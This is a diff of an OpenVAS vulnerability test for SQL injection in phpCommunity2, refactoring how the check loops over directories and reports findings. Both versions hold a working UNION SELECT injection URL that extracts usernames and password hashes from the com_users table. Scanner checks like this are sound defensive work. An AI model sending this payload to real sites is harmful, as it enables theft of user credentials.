@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: phpCommunity2_multiple_remote_input_validation.nasl 5016 2017-01-17 09:06:21Z teissa $
+# $Id: phpCommunity2_multiple_remote_input_validation.nasl 5770 2017-03-29 14:34:03Z cfi $
 #
 # phpCommunity2 Multiple Remote Input Validation Vulnerabilities
 #
@@ -38,19 +38,16 @@ tag_summary = "phpCommunity2 is prone to multiple input-validation vulnerabiliti
 if (description)
 {
  script_id(100041);
- script_version("$Revision: 5016 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-17 10:06:21 +0100 (Tue, 17 Jan 2017) $");
+ script_version("$Revision: 5770 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 16:34:03 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)");
  script_cve_id("CVE-2009-4884", "CVE-2009-4885", "CVE-2009-4886");
  script_bugtraq_id(34056);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
-
  script_name("phpCommunity2 Multiple Remote Input Validation Vulnerabilities");
-
-
- script_category(ACT_GATHER_INFO);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_category(ACT_ATTACK);
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -65,22 +62,18 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port)) exit(0);
 
-dir = make_list("/phpcom", cgi_dirs());
+foreach dir( make_list_unique( "/phpcom", cgi_dirs( port:port ) ) ) {
 
-foreach d (dir)
-{ 
- url = string(d, "/index.php?n=guest&c=0&m=search&s=forum&wert=-1%25%22%20UNION%20ALL%20SELECT%201,2,3,4,CONCAT(nick,%200x3a,%20pwd),6%20FROM%20com_users%23");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
- if( buf == NULL )exit(0);
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/index.php?n=guest&c=0&m=search&s=forum&wert=-1%25%22%20UNION%20ALL%20SELECT%201,2,3,4,CONCAT(nick,%200x3a,%20pwd),6%20FROM%20com_users%23");
 
- if ( buf =~ "admin:[a-f0-9]{32}"  )
-   {    
-    security_message(port:port);
-    exit(0);
-   }
+  if(http_vuln_check(port:port, url:url,pattern:"admin:[a-f0-9]{32}")) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
+
+exit( 99 );
